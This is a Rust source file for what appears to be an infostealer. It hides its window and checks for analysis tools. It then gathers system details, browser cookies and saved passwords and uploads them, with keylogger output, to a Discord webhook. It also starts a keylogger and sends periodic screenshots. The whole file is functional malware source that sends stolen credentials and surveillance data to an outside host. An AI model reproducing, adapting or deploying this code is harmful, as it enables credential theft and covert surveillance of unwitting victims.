// Comment for debugging 
#![windows_subsystem = "windows"]

use anyhow::Result;
use keylogger::keylog_all;
use serenity::{
    http::Http,
    model::{
        channel::{AttachmentType, Embed},
        webhook::Webhook,
    },
};
use std::{env, fs, path::PathBuf, process, thread};
use sysinfo::{System, SystemExt};
use takescreenshots::run;

use antilysis; // Our crate at crate.io !

mod constants;
mod cookies;
mod keylogger;
mod utils;
mod takescreenshots;

use crate::utils::unwrap_string;

// Send elements to Discord servers with Discord Webhooks.
async fn send(data: String, file: PathBuf, file2: PathBuf, file3: PathBuf) -> Result<()> {
    let http = Http::new("token");
    let url = constants::DISCORD_URL;

    // Create webhook.
    let webhook = Webhook::from_url(&http, url).await?;

    // Embed [data] in a discord message.
    let embed = Embed::fake(|e| {
        e.title("System info");
        e.description(data);
        e
    });

    // Execute Webhook, add metadata, content and files.
    webhook
        .execute(&http, true, |w| {
            w.content("content")
                .username("username")
                .embeds(vec![embed])
                .add_file(AttachmentType::Path(&file))
                .add_file(AttachmentType::Path(&file2));
            // Add [logs.txt] only if it exists (which isn't the case at the first run).
            if file3.exists() {
                w.add_file(AttachmentType::Path(&file3));
            }
            w
        })
        .await?;
    Ok(())
}

// Async main function, needs [tokio] crate to work, [futures] isn't enough.
#[tokio::main]
async fn main() {
    // Kill process if anti-analysis are present.
    if antilysis::detected() {
        // Decomment for demo.
        // process::exit(0);
    }

    // Get system info and store them in a String.
    let sys = System::new_all();
    let mut sysinfo = String::new();
    sysinfo.push_str(&format!(
        "Username:                {}\n",
        env::var_os("USERNAME").unwrap().into_string().unwrap()
    ));
    sysinfo.push_str(&format!(
        "System name:             {}\n",
        unwrap_string(sys.name())
    ));
    sysinfo.push_str(&format!(
        "System OS version:       {}\n",
        unwrap_string(sys.os_version())
    ));
    sysinfo.push_str(&format!(
        "System host name:        {}\n",
        unwrap_string(sys.host_name())
    ));

    // Create cookies files and write the cookies we get with [cookies.rs] in it.
    let cookies_file = env::temp_dir().join("cookies.txt");
    let cookies_strings = cookies::get_cookies().unwrap();
    fs::write(&cookies_file, cookies_strings.join("\n")).unwrap();

    // Create cookies files and write the passwords we get with [cookies.rs] in it.
    let passwords_file = env::temp_dir().join("passwords.txt");
    let passwords_strings = cookies::get_passwords().unwrap();
    fs::write(&passwords_file, passwords_strings.join("\n")).unwrap();

    // Create logs file Path
    let logs = env::temp_dir().join("logs.txt");

    // Send system info, cookies, passwords and logs (if present, they aren't after first run) to Discord server.
    send(sysinfo, cookies_file, passwords_file, logs).await;

    if constants::KEYLOG {
        thread::spawn(|| {
            // Start keylogging to [logs.txt], ends at shutdown and restarts at reboot (thanks to the injector)
            keylog_all();
        });
    }

    // take a screenshot every and send it every 5 seconds
    if constants::SCREENSHOTS {
        run().await;
    }
}
